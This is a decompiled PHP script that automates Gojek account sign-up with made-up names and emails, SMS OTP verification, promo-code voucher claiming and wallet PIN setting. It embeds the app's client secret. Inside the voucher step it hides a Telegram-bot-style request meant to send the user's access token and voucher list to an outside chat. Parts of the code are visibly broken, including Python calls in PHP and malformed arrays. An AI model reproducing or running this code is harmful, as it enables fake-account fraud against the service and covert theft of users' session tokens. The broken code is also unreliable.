<?php
#Decompile by Nariox
date_default_timezone_set('Asia/Jakarta');
include "functiony.php";
ulang:
// function change(){
os.system('clear');
echo color("red","* simsalabim-PATI \n");
echo color("red","* simsalabim-PATI \n");
echo color("white","* simsalabim-PATI \n");
echo color("white","* simsalabim-PATI \n");
echo color("green","* Time : ".date('[d-m-Y] [H:i:s]')." \n");
        $nama = nama();
        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
        echo color("red","* Nomer : ");
        // $no = trim(fgets(STDIN));
        $nohp = trim(fgets(STDIN));
        $nohp = str_replace("62","62",$nohp);
        $nohp = str_replace("(","",$nohp);
        $nohp = str_replace(")","",$nohp);
        $nohp = str_replace("-","",$nohp);
        $nohp = str_replace(" ","",$nohp);

        if (!preg_match('/[^+0-9]/', trim($nohp))) {
            if (substr(trim($nohp),0,3)=='62') {
                $hp = trim($nohp);
            }
            else if (substr(trim($nohp),0,1)=='0') {
                $hp = '62'.substr(trim($nohp),1);
        }
         elseif(substr(trim($nohp), 0, 2)=='62'){
            $hp = '6'.substr(trim($nohp), 1);
        }
        else{
            $hp = '1'.substr(trim($nohp),0,13);
        }
    }
        $data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$hp.'","signed_up_country":"ID"}';
        $register = request("/v5/customers", null, $data);
        if(strpos($register, '"otp_token"')){
        $otptoken = getStr('"otp_token":"','"',$register);
        echo color("green","* Asupkeun kode SMS!")."\n";
        otp:
        echo color("blue","* Kode SMS : ");
        $otp = trim(fgets(STDIN));
        $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
        $verif = request("/v5/customers/phone/verify", null, $data1);
        if(strpos($verif, '"access_token"')){
        echo color("yellow","BERHASIL REGIST\n");
        $token = getStr('"access_token":"','"',$verif);
        $uuid = getStr('"resource_owner_id":',',',$verif);
        echo color("green","+] Token : ".$token."\n\n");
        save("token.txt",$token); 
}
}
{
echo color("red","* TOKEN KODE \n");

$ydf = new ydf();
/** 
@ step 1
return @type json contain <otpToken> 
*/
echo color("green","* Ulang Nomer nu di luhur : ");
$phoneNumber = trim(fgets(STDIN));
$getOTPToken = $ydf->loginRequest($phoneNumber);
$json = json_decode($getOTPToken, true);
$OTPToken = $json['data']['otp_token'];
echo color("blue","* Kode SMS: ");
$otpCode = trim(fgets(STDIN));
echo color("purple","Token id : ");
echo $OTPToken;
$getAccesstoken = $ydf->getAuthToken($OTPToken, $otpCode);
$json = json_decode($getAccesstoken, true);
$accesstoken = $json['access_token'];
$accesstoken = $json['access_token'];
echo "\n";
}

date_default_timezone_set('Asia/Jakarta');
include_once ('functiony.php');
$token = $accesstoken;
        {
        echo color("red","~Klaim Voucher~");
        echo "\n".color("white","* Klaim Voucher GOJEK");
        echo "\n".color("blue","* TUNGGU NDISIK LUR..");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(5);
        }
        $code1 = request2('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"HARIJADIMART"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
        echo "\n".color("green","* Message: ".$message);
        goto gocar;
        }else{
        echo "\n".color("red","* Message: ".$message);
          gocar:
        sleep(5);
        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=13&page=1', $token);
        $total = fetch_value($cekvoucher,'"total_vouchers":',',');
		$voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
		$voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
		$voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
		$voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
		$voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
		$voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
		$voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
		$voucher8 = getStr1('"title":"','",',$cekvoucher,"8");
		$voucher9 = getStr1('"title":"','",',$cekvoucher,"9");
		$voucher10 = getStr1('"title":"','",',$cekvoucher,"10");
        echo "\n".color("green","Voucher ".$total." : ");
        echo "\n".color("red","                     1. ".$voucher1);
        echo "\n".color("green","                     2. ".$voucher2);
        echo "\n".color("blue","                     3. ".$voucher3);
        echo "\n".color("red","                     4. ".$voucher4);
        echo "\n".color("green","                     5. ".$voucher5);
        echo "\n".color("blue","                     6. ".$voucher6);
        echo "\n".color("red","                     7. ".$voucher7);
        echo "\n".color("green","                     8. ".$voucher8);
        echo "\n".color("blue","                     9. ".$voucher9);
        echo "\n".color("white","                     10. ".$voucher10);
        echo"\n";
         $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
         $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
         $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
         $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
         $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
         $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
         $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
         $expired8 = getStr1('"expiry_date":"','"',$cekvoucher,'8');
         $expired9 = getStr1('"expiry_date":"','"',$cekvoucher,'9');
         $expired10 = getStr1('"expiry_date":"','"',$cekvoucher,'10');
         $TOKEN  = "1";
         $chatid = "11";
         $pesan 	= "♤ \n\n [bung.php] \n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
         $method	= "sendMessage";
         $url    = "h" . $TOKEN . "/". $method;
         $post = [
         'chat_id' => $chatid,31
         ];
         $header = [
         "X-Requested-With: XMLHttpRequest",
         "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
         ];
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
         curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         $datas = curl_exec($ch);
         $error = curl_error($ch);
         $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
         curl_close($ch);
         $debug['text'] = $pesan;
         $debug['respon'] = json_decode($datas, true);
         }
}


echo "\n".color("red","Seting PIN ? : y/n ");
         $pilih1 = trim(fgets(STDIN));
         if($pilih1 == "y" || $pilih1 == "Y"){
         //if($pilih1 == "y" && strpos($no, "628")){
         echo color("green","PIN 147896")."\n";
         $data2 = '{"pin":"147896"}';
         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
         echo color("blue", "Otp pin: "."\n");
         $otpsetpin = trim(fgets(STDIN));
         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
         echo $verifotpsetpin;
         }else if($pilih1 == "n" || $pilih1 == "N"){
         die();
         }else{
         echo color("red","-] GAGAL!!!\n");}
?>
